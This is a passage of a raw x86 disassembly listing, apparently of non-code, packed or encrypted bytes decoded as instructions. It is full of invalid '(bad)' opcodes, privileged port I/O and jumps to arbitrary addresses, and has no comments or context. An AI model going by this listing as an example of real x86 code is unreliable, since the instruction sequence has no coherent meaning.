  422315:	retf   
  422316:	adc    esi,DWORD PTR [edx-0x6d]
  422319:	test   BYTE PTR [ecx+0x52],0xf1
  42231d:	out    dx,eax
  42231e:	adc    eax,0xc7986a03
  422323:	mov    ?,WORD PTR [edi+0x66bdfe4b]
  422329:	sbb    bh,dh
  42232b:	dec    ebx
  42232c:	jle    0x4223a2
  42232e:	push   esp
  42232f:	aad    0xd2
  422331:	xchg   DWORD PTR [edx+eax*8],esp
  422334:	jo     0x422374
  422336:	loopne 0x422309
  422338:	push   0x991fce71
  42233d:	bound  edi,QWORD PTR [edx+0x1de69598]
  422343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422344:	cmp    edi,DWORD PTR [esi-0x9]
  422347:	out    0x2,al
  422349:	scas   al,BYTE PTR es:[edi]
  42234a:	outs   dx,DWORD PTR ds:[esi]
  42234b:	push   es
  42234c:	and    al,0x2c
  42234e:	outs   dx,BYTE PTR ds:[esi]
  42234f:	cs fninit 
  422352:	fs sub al,dl
  422355:	clc    
  422356:	lods   eax,DWORD PTR ds:[esi]
  422357:	xchg   esp,eax
  422358:	scas   eax,DWORD PTR es:[edi]
  422359:	in     eax,0xa0
  42235b:	add    DWORD PTR [eax+0x5e],edi
  42235e:	dec    esp
  42235f:	mov    ecx,0x7c28f707
  422364:	jle    0x4223e1
  422366:	stc    
  422367:	pop    ebp
  422368:	repnz push 0xdee11096
  42236e:	push   edx
  42236f:	in     al,dx
  422370:	and    al,0x9a
  422372:	mov    WORD PTR [eax-0x6fc5fc89],es
  422378:	or     BYTE PTR [edi+0x2187dacd],bh
  42237e:	addr16 retf 
  422380:	dec    edi
  422381:	xchg   ebx,eax
  422382:	jle    0x4223d6
  422384:	es retf 
  422386:	mov    ds:0xbeb27163,al
  42238b:	enter  0x1a15,0xdc
  42238f:	cdq    
  422390:	push   es
  422391:	jae    0x42233b
  422393:	xor    esi,DWORD PTR [ecx-0x68]
  422396:	jl     0x42236a
  422398:	jecxz  0x42231c
  42239a:	mov    esp,0x2a449209
  42239f:	adc    al,0xeb
  4223a1:	sub    BYTE PTR [eax],ch
  4223a3:	sbb    ecx,DWORD PTR [ecx]
  4223a5:	sysret 
  4223a7:	push   esi
  4223a8:	or     al,0x91
  4223aa:	mov    ebx,0x15feb068
  4223af:	repnz fdivr QWORD PTR [eax-0x37]
  4223b3:	les    ebx,FWORD PTR [edx]
  4223b5:	jne    0x4223ec
  4223b7:	neg    DWORD PTR [eax]
  4223b9:	(bad)  
  4223ba:	nop
  4223bb:	jmp    0x9e2588f5
  4223c0:	xchg   ecx,eax
  4223c1:	sub    BYTE PTR [ebp+0x7],bh
  4223c4:	gs jb  0x422410
  4223c7:	je     0x422444
  4223c9:	adc    BYTE PTR [edi],al
  4223cb:	stos   BYTE PTR es:[edi],al
  4223cc:	in     eax,dx
  4223cd:	imul   ebp,DWORD PTR [esi+0x7],0x0
  4223d1:	test   eax,0xed7109cb
  4223d6:	je     0x42242a
  4223d8:	cmp    cl,BYTE PTR [ebx]
  4223da:	jae    0x42240c
  4223dc:	cmp    cl,BYTE PTR [ebx-0x2d]
  4223df:	xchg   esi,eax
  4223e0:	xchg   edx,eax
  4223e1:	xchg   esi,eax
  4223e2:	imul   ebx,DWORD PTR [edx-0x60c1599b],0xffffffde
  4223e9:	cmp    ecx,DWORD PTR [edi-0x60]
  4223ec:	or     DWORD PTR [ebx],ebp
  4223ee:	or     DWORD PTR [ecx+ebp*1-0x72],esp
  4223f2:	push   ss
  4223f3:	cwde   
  4223f4:	xor    DWORD PTR [edx+0x6c],edx
  4223f7:	cdq    
  4223f8:	sub    al,0x87
  4223fa:	(bad)  
  4223fb:	xor    eax,DWORD PTR [edi]
  4223fd:	pushf  
  4223fe:	lods   eax,DWORD PTR ds:[esi]
  4223ff:	aas    
  422400:	outs   dx,DWORD PTR ds:[esi]
  422401:	xor    al,BYTE PTR [ebx]
  422403:	pop    esi
  422404:	(bad)  
  422405:	fidiv  DWORD PTR [esi+ebp*1+0x296bb7b6]
  42240c:	(bad)  
  42240e:	and    al,0x9e
  422410:	ins    BYTE PTR es:[edi],dx
  422411:	xchg   ecx,eax
  422412:	push   eax
  422413:	jmp    0x44a54847
  422418:	rol    BYTE PTR [ecx+esi*2],1
  42241b:	or     esp,DWORD PTR [esi-0x5b]
  42241e:	aas    
  42241f:	xchg   edi,eax
  422420:	hlt    
  422421:	dec    ebp
  422422:	mov    ecx,0x60307057
  422427:	call   0x550f06ac
  42242c:	xlat   BYTE PTR ds:[ebx]
  42242d:	(bad)  
  42242e:	es (bad) 
  422430:	fnstenv [edx]
  422432:	scas   eax,DWORD PTR es:[edi]
  422433:	sub    al,0xda
  422435:	mov    ch,bl
  422437:	out    dx,eax
  422438:	and    al,dl
  42243a:	mov    cl,0xc6
  42243c:	xchg   DWORD PTR [esi-0x40a06db4],edi
  422442:	pop    es
  422443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422444:	out    0xf7,al
  422446:	adc    BYTE PTR [ebx+0x3c327b11],dh
  42244c:	mov    bl,0xfc
  42244e:	sbb    al,0x24
  422450:	ins    BYTE PTR es:[edi],dx
  422451:	retf   
  422452:	call   0xc769:0x8c3d5de6
  422459:	mov    bh,al
  42245b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245d:	jmp    edi
  42245f:	sti    
  422460:	or     BYTE PTR [esi+edx*2],bl
  422463:	adc    DWORD PTR [eax-0xb1271e9],ebx
  422469:	mov    cl,0x37
  42246b:	cmp    bl,BYTE PTR [eax+0x19]
  42246e:	jge    0x42245d
  422470:	or     eax,0xe36a908a
  422475:	lds    eax,FWORD PTR [ecx-0x7b5443c6]
  42247b:	imul   ebx,DWORD PTR [edx-0x68],0x50
  42247f:	or     DWORD PTR [esi],ecx
  422481:	jo     0x4224cb
  422483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422484:	fisubr DWORD PTR [esp+eax*1+0x376c237b]
  42248b:	push   0xe43a026a
  422490:	mov    ah,BYTE PTR [esi-0x3c88dc3d]
  422496:	push   0xfffffff1
  422498:	call   0xca0f:0x285fce77
  42249f:	ja     0x4224a5
  4224a1:	ins    DWORD PTR es:[edi],dx
  4224a2:	int3   
  4224a3:	dec    edi
  4224a4:	jne    0x422454
  4224a6:	gs inc esp
  4224a8:	outs   dx,DWORD PTR ds:[esi]
  4224a9:	and    BYTE PTR [eiz*1+0x26f1843a],ch
  4224b0:	test   BYTE PTR [ecx+esi*8-0x58],0x1
  4224b5:	loop   0x4224f4
  4224b7:	cdq    
  4224b8:	cmp    DWORD PTR [ecx],edx
  4224ba:	or     BYTE PTR [ebx],bh
  4224bc:	ret    
  4224bd:	xchg   ecx,eax
  4224be:	and    DWORD PTR [ebx-0x3],ecx
  4224c1:	ja     0x422512
  4224c3:	ins    DWORD PTR es:[edi],dx
  4224c4:	mov    eax,ds:0xd32d5986
  4224c9:	sub    ah,BYTE PTR [esp+ebp*1]
  4224cc:	push   ebp
  4224cd:	mov    ebp,0x5bec85f6
  4224d2:	or     DWORD PTR [esi+0x4fe179b7],esi
  4224d8:	jmp    0x8b82405c
  4224dd:	lahf   
  4224de:	xor    ebx,DWORD PTR [eax+0x55]
  4224e1:	out    0xed,eax
  4224e3:	and    edx,eax
  4224e5:	loope  0x4224e5
  4224e7:	push   ebx
  4224e8:	inc    esp
  4224e9:	hlt    
  4224ea:	(bad)  
  4224eb:	out    dx,al
  4224ec:	imul   edx,DWORD PTR [edx+0x55495f91],0xffffff93
  4224f3:	xor    DWORD PTR [edx],ebp
  4224f5:	fdivr  DWORD PTR [edi]
  4224f7:	outs   dx,BYTE PTR ds:[esi]
  4224f8:	adc    bl,BYTE PTR [ebp-0x14325c9c]
  4224fe:	cld    
  4224ff:	mov    WORD PTR [esi],ss
  422501:	dec    ecx
  422502:	cmp    edx,edx
  422504:	(bad)  
  422505:	(bad)  
  422507:	mov    ah,0x1f
  422509:	inc    esp
  42250a:	call   0x4c4b:0x43b526cb
  422511:	add    al,0x30
  422513:	dec    edx
  422514:	out    dx,eax
  422515:	in     al,dx
  422516:	cmp    BYTE PTR es:[esi-0x39654a51],ch
  42251d:	cmp    ah,bh
  42251f:	push   ebp
  422520:	in     eax,dx
  422521:	mov    WORD PTR [edi],es
  422523:	and    al,0x4b
  422525:	or     al,0x8e
  422527:	mov    ch,0xc2
  422529:	push   esp
  42252a:	mov    ch,0x6a
  42252c:	addr16 mov edx,0xfcc410fa
  422532:	or     BYTE PTR [eax],al
  422534:	rcr    DWORD PTR [edx+0x38dc95e2],cl
  42253a:	and    al,BYTE PTR [edi+0x55]
  42253d:	nop
  42253e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42253f:	out    dx,eax
  422540:	pushf  
  422541:	xchg   ecx,eax
  422542:	and    BYTE PTR [edi+0x4d],bh
  422545:	pop    eax
  422546:	push   eax
  422547:	jmp    0x16dfdb23
  42254c:	sub    dl,al
  42254e:	sti    
  42254f:	xchg   esp,eax
  422550:	mov    dh,0x41
  422552:	addr16 jg 0x42251b
  422555:	loope  0x42253c
  422557:	loopne 0x422561
  422559:	sub    BYTE PTR ds:0xc8288382,ah
  42255f:	xchg   BYTE PTR [ecx+0x36],ah
  422562:	xchg   edx,eax
  422563:	jl     0x42253d
  422565:	mov    ah,0x9
  422567:	jmp    0x6ff370e6
  42256c:	inc    edx
  42256d:	dec    eax
  42256e:	sub    edx,DWORD PTR [edx-0x14]
  422571:	and    al,0x93
  422573:	dec    esp
  422574:	mov    al,ds:0x2f7b580
  422579:	and    eax,0x6e83bd15
  42257e:	add    bh,BYTE PTR [ebx-0x2212cbbe]
  422584:	add    al,BYTE PTR [eax]
  422586:	mov    cl,0x48
  422588:	outs   dx,BYTE PTR ds:[esi]
  422589:	xlat   BYTE PTR ds:[ebx]
  42258a:	retf   0x1b23
  42258d:	adc    DWORD PTR [eax-0x760a1619],esp
  422593:	out    dx,eax
  422594:	jns    0x422535
  422596:	adc    eax,0x8427aea7
  42259b:	xchg   esi,eax
  42259c:	out    0xec,eax
  42259e:	les    esi,FWORD PTR [ebx+0x44]
  4225a1:	and    al,0xfa
  4225a3:	and    eax,0xf66da689
  4225a8:	add    ebx,DWORD PTR [edx+0x2]
  4225ab:	and    eax,0xa4e07173
  4225b0:	dec    ebp
  4225b1:	jnp    0x4225a1
  4225b3:	gs adc al,0x2
  4225b6:	or     al,0x9e
  4225b8:	sbb    ch,dh
  4225ba:	pusha  
  4225bb:	cmp    BYTE PTR [edi],ah
  4225bd:	add    al,0x74
  4225bf:	cmp    esi,DWORD PTR [esi+0x48]
  4225c2:	xchg   ebp,eax
  4225c3:	icebp  
  4225c4:	fnstenv ds:0x90a771f3
  4225ca:	push   edi
  4225cb:	xor    DWORD PTR [ebp-0x507a7789],0xf6e643ef
  4225d5:	inc    edi
  4225d6:	dec    eax
  4225d7:	pop    eax
  4225d8:	aas    
  4225d9:	xor    DWORD PTR es:[ebp-0x7a],ecx
  4225dd:	inc    esp
  4225de:	mov    eax,0x619e5cb7
  4225e3:	adc    DWORD PTR [edi],ecx
  4225e5:	adc    ebp,DWORD PTR [eax+0x50ad791b]
  4225eb:	jp     0x422622
  4225ed:	cs iretw 
  4225f0:	out    dx,al
  4225f1:	push   ecx
  4225f2:	push   cs
  4225f3:	popa   
  4225f4:	dec    ebx
  4225f5:	adc    BYTE PTR [ecx+0x2d9982fe],dl
  4225fb:	or     DWORD PTR [esi],ecx
  4225fd:	loope  0x42263d
  4225ff:	or     eax,0xeb3198d2
  422604:	fcmove st,st(0)
  422606:	mov    DWORD PTR [edi],ebp
  422608:	lea    eax,[edx+edx*1-0x67aed519]
  42260f:	outs   dx,DWORD PTR ds:[esi]
  422610:	ins    BYTE PTR es:[edi],dx
  422611:	dec    ecx
  422612:	add    al,0x81
  422614:	mov    eax,ds:0xe135baea
  422619:	cs push cs
  42261b:	jno    0x4225d8
  42261d:	js     0x42266e
  42261f:	mov    cl,0x68
  422621:	nop
  422622:	cmp    DWORD PTR ss:[esi+edi*1-0x741fd545],ebp
  42262a:	in     al,dx
  42262b:	lds    eax,FWORD PTR [ecx]
  42262d:	imul   ebp,DWORD PTR [eax+0x7d7ea0eb],0xffffffbf
  422634:	fimul  DWORD PTR [esi]
  422636:	push   ss
  422637:	adc    al,0x9d
  422639:	fmul   DWORD PTR [edi-0x1a]
  42263c:	ds fs iret 
  42263f:	sub    al,bh
  422641:	add    eax,0xe110a30a
  422646:	in     eax,0xe4
  422648:	sub    dl,dh
  42264a:	mov    eax,DWORD PTR [esi]
  42264c:	(bad)  
  42264d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42264e:	xchg   edi,eax
  42264f:	ret    0x7a84
  422652:	xchg   esi,eax
  422653:	cmp    eax,0x87c7c29d
  422658:	aad    0x5
  42265a:	fsubr  QWORD PTR fs:[ebx]
  42265d:	push   esi
  42265e:	cdq    
  42265f:	mov    bh,0x67
  422661:	stc    
  422662:	pop    ds
  422663:	(bad)  
  422664:	aad    0xed
  422666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422667:	sub    al,0x21
  422669:	inc    esp
  42266a:	dec    ecx
  42266b:	daa    
  42266c:	call   0xce6c:0x1205b1e9
  422673:	cmp    BYTE PTR [edi+0xe1d692],al
  422679:	fnstcw WORD PTR [esi]
  42267b:	push   ebp
  42267c:	add    bl,cl
  42267e:	arpl   WORD PTR [esi+eax*2-0x3c73c046],si
  422685:	push   0xffffff9b
  422687:	(bad)  
  422688:	cs enter 0xe1b7,0x61
  42268d:	out    0x32,eax
  42268f:	test   al,0x3e
  422691:	mov    eax,0xda0c3b0c
  422696:	push   edx
  422697:	dec    ecx
  422698:	ret    
  422699:	push   edx
  42269a:	aam    0xf
  42269c:	inc    ecx
  42269d:	or     al,0xb4
  42269f:	xchg   ebx,eax
  4226a0:	sub    eax,0xaccdd174
  4226a5:	mov    eax,0xd6bb3fbc
  4226aa:	and    BYTE PTR [edi+0x49],ah
  4226ad:	dec    esp
  4226ae:	loopne 0x42265f
  4226b0:	ss jge 0x422718
  4226b3:	pop    ebp
  4226b4:	dec    edx
  4226b5:	pop    edx
  4226b6:	xchg   esp,eax
  4226b7:	and    esi,ebp
  4226b9:	outs   dx,BYTE PTR ds:[esi]
  4226ba:	loope  0x42265b
  4226bc:	retf   0x3dc6
  4226bf:	and    ecx,0x8789199
  4226c5:	imul   esi,DWORD PTR [edi-0xa73a249],0xffffff80
  4226cc:	sub    al,0x43
  4226ce:	iret   
  4226cf:	cmp    ch,BYTE PTR [edi-0x72da143f]
  4226d5:	sbb    DWORD PTR [ebx],ebp
  4226d7:	dec    esi
  4226d8:	sub    al,0x7a
  4226da:	cmp    DWORD PTR [ebx+0x60],eax
  4226dd:	mov    eax,ds:0x149d65c8
  4226e2:	ds mov cl,0x9c
  4226e5:	xor    bh,dh
  4226e7:	push   ds
  4226e8:	aad    0xb
  4226ea:	aas    
  4226eb:	ficom  DWORD PTR [ebx-0x33]
  4226ee:	push   cs
  4226ef:	cli    
  4226f0:	xor    al,0x13
  4226f2:	ss popf 
  4226f4:	or     ebp,edx
  4226f6:	(bad)  
  4226f7:	xor    eax,DWORD PTR [edi+eax*8]
  4226fa:	cmp    ecx,DWORD PTR [esi-0x72]
  4226fd:	pop    eax
  4226fe:	stc    
  4226ff:	out    0x4e,eax
  422701:	fidiv  DWORD PTR [eax+ecx*4]
  422704:	ja     0x4226ca
  422706:	cwde   
  422707:	mov    cl,0x43
  422709:	jnp    0x4226c2
  42270b:	and    DWORD PTR [esi+0x3a5b5a95],0xe
  422712:	sar    BYTE PTR [esi+0x71b07445],0xda
  422719:	inc    eax
  42271a:	mov    edx,0xbcba9b76
  42271f:	scas   al,BYTE PTR es:[edi]
  422720:	push   0xd8644b9c
  422725:	mov    ch,0xa
  422727:	sbb    eax,ebx
  422729:	dec    esp
  42272a:	loop   0x4226c1
  42272c:	jg     0x4226c9
  42272e:	mov    esp,0x5add13cc
  422733:	repnz out 0x80,eax
  422736:	mov    ebp,edi
  422738:	mov    ds:0xc0e226f4,eax
  42273d:	aaa    
  42273e:	(bad)
  422742:	or     bh,0x78
  422745:	inc    ebx
  422746:	cmp    ebp,edi
  422748:	sbb    BYTE PTR es:[edi],bh
  42274b:	cld    
  42274c:	dec    ecx
  42274d:	cs clc 
  42274f:	push   ecx
  422750:	gs test al,0x90
  422753:	mov    al,ds:0x2c6e013d
  422758:	add    al,0x4b
  42275a:	shr    DWORD PTR [edx+edi*4+0x65],0xbc
  42275f:	pop    edx
  422760:	xchg   BYTE PTR [eax+edx*8],bl
  422763:	int3   
  422764:	and    ch,BYTE PTR [edi+0x4c]
  422767:	xchg   esi,eax
  422768:	jle    0x422742
  42276a:	(bad)  
  42276b:	lods   eax,DWORD PTR ds:[esi]
  42276c:	repnz sbb BYTE PTR [esi-0x30b4975f],al
  422773:	mov    ebx,0x34acfc4d
  422778:	js     0x4227d1
  42277a:	retf   
  42277b:	mov    ds:0x23e11347,eax
  422780:	inc    esp
  422781:	loopne 0x422738
  422783:	je     0x422774
  422785:	add    ch,BYTE PTR [ebp+0x13d7ac36]
  42278b:	and    DWORD PTR [ecx+edx*1+0x6be688ef],0xffffffdc
  422793:	sub    ecx,DWORD PTR [ecx]
  422795:	rol    bh,cl
  422797:	pop    ds
  422798:	jmp    0x4227fc
  42279a:	push   cs
  42279b:	jno    0x42277a
  42279d:	push   ebp
  42279e:	push   es
  42279f:	cmp    BYTE PTR [eax+ecx*4+0x15],0x2b
  4227a4:	sub    esp,ebx
  4227a6:	les    esi,FWORD PTR [eax]
  4227a8:	rcr    BYTE PTR [esi],cl
  4227aa:	and    BYTE PTR [ebp+esi*8-0x4],ch
  4227ae:	mov    eax,0x5983bb0b
  4227b3:	fwait
  4227b4:	cwde   
  4227b5:	mov    dh,0x3
  4227b7:	sub    edx,DWORD PTR [ecx]
  4227b9:	push   0xd51234ca
  4227be:	mov    esp,fs
  4227c0:	ficom  DWORD PTR [ebx+0x14]
  4227c3:	and    DWORD PTR [eax],ebp
  4227c5:	or     DWORD PTR [ecx-0x19],0x987ce2ed
  4227cc:	pop    edx
  4227cd:	sbb    DWORD PTR [edx],ebp
  4227cf:	aas    
  4227d0:	dec    ecx
  4227d1:	retf   
  4227d2:	leave  
  4227d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d4:	jno    0x4227f2
  4227d6:	pop    ss
  4227d7:	je     0x422792
  4227d9:	dec    edi
  4227da:	out    dx,al
  4227db:	leave  
  4227dc:	push   edi
  4227dd:	popa   
  4227de:	jmp    0xa60a:0xf752957
  4227e5:	push   edx
  4227e6:	pop    ebx
  4227e7:	js     0x422789
  4227e9:	push   ds
  4227ea:	xchg   edx,eax
  4227eb:	or     eax,0xc1b7b072
  4227f0:	cld    
  4227f1:	das    
  4227f2:	inc    ebx
  4227f3:	cli    
  4227f4:	cmp    al,0xcf
  4227f6:	ret    0x26ff
  4227f9:	adc    ecx,edx
  4227fb:	or     al,0xa7
  4227fd:	call   0x1fbcc740
  422802:	das    
  422803:	and    esi,DWORD PTR [ebp+0x51aba367]
  422809:	jmp    0x5b9c3ccc
  42280e:	cmp    al,0xe4
  422811:	push   es
  422812:	dec    esi
  422813:	fiadd  WORD PTR [eax-0x17589ef8]
  422819:	dec    ebp
  42281a:	icebp  
  42281b:	mov    cl,0xb9
  42281d:	and    DWORD PTR [eax+0x7b],ecx
  422820:	mov    ecx,0xbcf1e632
  422825:	cmp    al,0xfa
  422827:	nop
  422828:	bound  esi,QWORD PTR [ebx+esi*8+0x5f587433]
  42282f:	lds    edx,FWORD PTR [eax+0x63603c90]
  422835:	dec    ebx
  422836:	mov    ecx,0xcfe9b4d9
  42283b:	nop
  42283c:	aad    0x2f
  42283e:	mov    ebp,0x6d127593
  422843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422844:	dec    esi
  422845:	pop    ss
  422846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422847:	(bad)  
  422848:	mov    ch,0xb5
  42284a:	sbb    esi,DWORD PTR [ebx-0x70]
  42284d:	sub    al,0x71
  42284f:	xor    BYTE PTR [ebx],ch
  422851:	jne    0x4228ba
  422853:	loope  0x4227d9
  422855:	jns    0x4228af
  422857:	in     al,dx
  422858:	adc    al,dh
  42285a:	xor    ah,BYTE PTR [edx+0x383d9c2b]
  422860:	sar    BYTE PTR [eax+0x4b3673e6],cl
  422866:	jmp    0x4228aa
  422868:	or     dl,BYTE PTR [bx]
  42286b:	jmp    0x9c47d633
  422870:	jne    0x4227f2
  422872:	mov    al,BYTE PTR [ebp-0x1ad22470]
  422878:	xor    eax,DWORD PTR [ecx]
  42287a:	pop    esi
  42287b:	cmp    al,0x18
  42287d:	xchg   ebp,eax
  42287e:	lods   eax,DWORD PTR ds:[esi]
  42287f:	dec    esp
  422880:	(bad)  
  422881:	fcom   DWORD PTR [edx]
  422883:	or     bl,ch
  422885:	into   
  422886:	in     al,0x93
  422888:	bound  esp,QWORD PTR [edi+0x6a4d1d38]
  42288e:	div    DWORD PTR [ebp-0x198bdcf6]
  422894:	jnp    0x422822
  422896:	sub    eax,0xd6dba35d
  42289b:	scas   eax,DWORD PTR es:[edi]
  42289c:	int3   
  42289d:	push   eax
  42289e:	aam    0xb7
  4228a0:	push   edi
  4228a1:	loope  0x42282d
  4228a3:	mov    bl,0x61
  4228a5:	pop    edi
  4228a6:	dec    eax
  4228a7:	imul   esp,DWORD PTR [ecx-0x55],0xffffffcc
  4228ab:	xor    eax,0xd5c3e608
  4228b0:	in     al,0xcd
  4228b2:	or     ecx,DWORD PTR [edx]
  4228b4:	or     al,0x4f
  4228b6:	and    DWORD PTR [eax+0x3e],edx
  4228b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228ba:	cmp    bh,bl
  4228bc:	popf   
  4228bd:	pop    ebx
  4228be:	iret   
  4228bf:	fbstp  TBYTE PTR [esi+0x7d]
  4228c2:	gs jns 0x422872
  4228c5:	mov    cl,0x49
  4228c7:	push   esi
  4228c8:	xor    dh,BYTE PTR [ecx+0x6d]
  4228cb:	ret    0x5ddc
  4228ce:	push   es
  4228cf:	push   esp
  4228d0:	mov    eax,ds:0x953fb731
  4228d5:	aam    0x27
  4228d7:	pop    esi
  4228d8:	clc    
  4228d9:	sub    BYTE PTR [edx+0x4d],0x72
  4228dd:	ror    BYTE PTR [edi],0x3e
  4228e0:	fnstenv [edx-0x4e]
  4228e3:	adc    al,0x8a
  4228e5:	sbb    eax,0xf02c2b74
  4228ea:	int3   
  4228eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228ec:	and    eax,0x7c7627b5
  4228f1:	push   0xd44950ca
  4228f6:	inc    eax
  4228f7:	push   ebp
  4228f8:	jmp    DWORD PTR [ecx]
  4228fa:	mov    eax,0x5e137d57
  4228ff:	pop    ss
  422900:	mov    eax,ds:0x3dceaf47
  422905:	jno    0x422896
  422907:	mov    edx,0xffc3043e
  42290c:	sbb    eax,DWORD PTR ds:0x5c8c3978
  422912:	sti    
  422913:	dec    ebx
  422914:	mov    ebx,0xf20083ef
  422919:	sub    DWORD PTR [ecx-0x6201bb38],esp
  42291f:	(bad)  
  422920:	stos   DWORD PTR es:[edi],eax
  422921:	add    BYTE PTR [edi+edx*1-0xd72e9a1],dl
  422928:	in     eax,dx
  422929:	dec    esi
  42292a:	inc    esi
  42292b:	in     eax,0x7c
  42292d:	mov    DWORD PTR [edi],esp
  42292f:	adc    ebp,DWORD PTR [edx-0x5071c36a]
  422935:	cmp    ecx,edx
  422937:	ds xchg edx,eax
  422939:	pop    edx
  42293a:	xlat   BYTE PTR ds:[ebx]
  42293b:	jns    0x42291b
  42293d:	leave  
  42293e:	(bad)  
  42293f:	mov    ebp,0x1a7cebb3
  422944:	xchg   ebx,eax
  422945:	jp     0x422996
  422947:	in     al,dx
  422948:	nop
  422949:	mov    bl,0xf0
  42294b:	and    eax,0xdf559462
  422950:	adc    DWORD PTR [esi-0x5e634c68],ebx
  422956:	mov    eax,ds:0xc5d388bd
  42295b:	sti    
  42295c:	leave  
  42295d:	das    
  42295e:	pop    eax
  42295f:	cmc    
  422960:	pop    ecx
  422961:	pop    esp
  422962:	(bad)  
  422963:	sbb    al,0x84
  422965:	push   edi
  422966:	lds    esi,FWORD PTR [di]
  422969:	arpl   WORD PTR [ecx-0x72],ax
  42296c:	ffree  st(3)
  42296e:	or     al,0xdb
  422970:	mov    edi,0xd6f39db4
  422975:	mov    ah,0x75
  422977:	and    DWORD PTR [ebx-0x45],0x2d
  42297b:	in     eax,dx
  42297c:	jae    0x422977
  42297e:	loop   0x42296e
  422980:	cdq    
  422981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422982:	pop    ebx
  422983:	lahf   
  422984:	cli    
  422985:	cdq    
  422986:	popf   
  422987:	int3   
  422988:	addr16 loopne 0x42293b
  42298b:	adc    DWORD PTR [ebx+0x1de7ab57],esi
  422991:	push   edx
  422992:	mov    al,ds:0x6f40c2e1
  422997:	pusha  
  422998:	push   esi
  422999:	out    dx,al
  42299a:	sbb    BYTE PTR [edi+0x6e9ce6ac],ch
  4229a0:	aas    
  4229a1:	jne    0x422976
  4229a3:	push   0xfffffffa
  4229a5:	xor    DWORD PTR [eax-0x26],ecx
  4229a8:	int    0x71
  4229aa:	aas    
  4229ab:	sbb    esp,DWORD PTR [edi-0x3f84232d]
  4229b1:	call   0xc921c8e
  4229b6:	add    DWORD PTR [esi],ebx
  4229b8:	retf   0x878
  4229bb:	dec    eax
  4229bc:	pop    es
  4229bd:	iret   
  4229be:	ss push 0x65008762
  4229c4:	pop    eax
  4229c5:	inc    ebp
  4229c6:	not    cl
  4229c8:	aaa    
  4229c9:	add    eax,0x5f287e67
  4229ce:	xchg   esp,eax
  4229cf:	pusha  
  4229d0:	push   es
  4229d1:	adc    BYTE PTR [edi-0x79958f0e],bh
  4229d7:	or     al,0x49
  4229d9:	pop    ds
  4229da:	stos   BYTE PTR es:[edi],al
  4229db:	iret   
  4229dc:	add    eax,DWORD PTR [ecx+ebp*2-0x2d074026]
  4229e3:	mov    ecx,0x4e38c062
  4229e8:	mov    eax,0x2b13f585
  4229ed:	lea    eax,[ebx]
  4229ef:	adc    al,ch
  4229f1:	xor    al,0x63
  4229f3:	mov    edx,0x5bc702fe
  4229f8:	jge    0x422a12
  4229fa:	sub    BYTE PTR [edi+ecx*4],ah
  4229fd:	retf   0x2256
  422a00:	cmp    eax,0x6f431d56
  422a05:	aad    0x4e
  422a07:	inc    esp
  422a08:	inc    eax
  422a09:	push   0x6d
  422a0b:	test   eax,0x284e8a90
  422a10:	mov    WORD PTR [eax-0x41],?
  422a13:	iret   
  422a14:	dec    ebx
  422a15:	gs push eax
  422a17:	aas    
  422a18:	add    BYTE PTR [esi],cl
  422a1a:	and    BYTE PTR [esi-0x40e90845],bh
  422a20:	inc    ecx
  422a21:	dec    ecx
  422a22:	pop    esp
  422a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a24:	dec    esi
  422a25:	fwait
  422a26:	push   0xffffff8e
  422a28:	mov    eax,0x826cdfb3
  422a2d:	and    dl,bl
  422a2f:	retf   
  422a30:	mov    edi,0x7efe96b1
  422a35:	jne    0x422a14
  422a37:	push   esi
  422a38:	ins    DWORD PTR es:[edi],dx
  422a39:	ja     0x422a33
  422a3b:	add    ebp,ecx
  422a3d:	cs ins DWORD PTR es:[edi],dx
  422a3f:	cmc    
  422a40:	imul   ebx,DWORD PTR [ebx],0x2cfa1533
  422a46:	xor    ch,0xea
  422a49:	aas    
  422a4a:	push   edx
  422a4b:	(bad)  
  422a4c:	or     al,0xce
  422a4e:	ret    0xd3a9
  422a51:	xor    eax,0x388c261f
  422a56:	sar    ah,1
  422a58:	add    DWORD PTR [ebx-0x5bff0e7d],eax
  422a5e:	iret   
  422a5f:	rcl    ch,0x11
  422a62:	xlat   BYTE PTR ds:[ebx]
  422a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a64:	jge    0x422a07
  422a66:	das    
  422a67:	pop    edi
  422a68:	or     edi,edi
  422a6a:	xor    eax,0xddff9f9
  422a6f:	jmp    0x5670:0x9de18cc3
  422a76:	clc    
  422a77:	jae    0x422ae6
  422a79:	mov    bh,0x55
  422a7b:	mov    ?,WORD PTR [edi+0x74]
  422a7e:	lds    ebp,FWORD PTR [edx-0x4d459779]
  422a84:	into   
  422a85:	js     0x422a39
  422a87:	push   es
  422a88:	add    eax,0xffb01607
  422a8d:	pop    es
  422a8e:	mov    bl,0x59
  422a90:	pusha  
  422a91:	xchg   ebp,eax
  422a92:	sar    DWORD PTR [edi-0xc],1
  422a95:	xchg   DWORD PTR [edx+0x38],edi
  422a98:	dec    edi
  422a99:	test   ebp,0x79d60ed7
  422a9f:	popa   
  422aa0:	jge    0x422b0f
  422aa2:	cwde   
  422aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aa4:	xchg   BYTE PTR [edx+0x39f9d0ef],ch
  422aaa:	sub    BYTE PTR [eax+0x12],al
  422aad:	add    al,dl
  422aaf:	popf   
  422ab0:	inc    esi
  422ab1:	cmp    bh,ah
  422ab3:	adc    al,0xa7
  422ab5:	mov    DWORD PTR [ecx-0x64202de],esp
  422abb:	ins    DWORD PTR es:[edi],dx
  422abc:	inc    esp
  422abd:	lahf   
  422abe:	mov    ah,0xe1
  422ac0:	sub    ecx,DWORD PTR [edi+ebx*8+0x3]
  422ac4:	test   DWORD PTR [esi+0x628003e5],0xae38b990
  422ace:	and    WORD PTR [ebp+esi*2-0x2bfac0f9],dx
